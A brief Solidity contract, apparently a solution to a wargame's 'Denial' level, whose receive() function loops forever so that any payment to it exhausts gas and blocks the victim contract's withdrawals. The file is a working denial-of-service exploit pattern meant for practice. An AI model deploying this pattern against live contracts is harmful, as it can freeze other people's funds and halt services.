// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Denial.sol";

contract Attack {
    Denial denial;
    address payable public owner;

    constructor(address payable _denial) public {
        denial = Denial(_denial);
        owner = msg.sender;
    }

    function withdraw() public {
        owner.transfer(address(this).balance);
    }

    receive() external payable {
        while (true) {}
    }
}
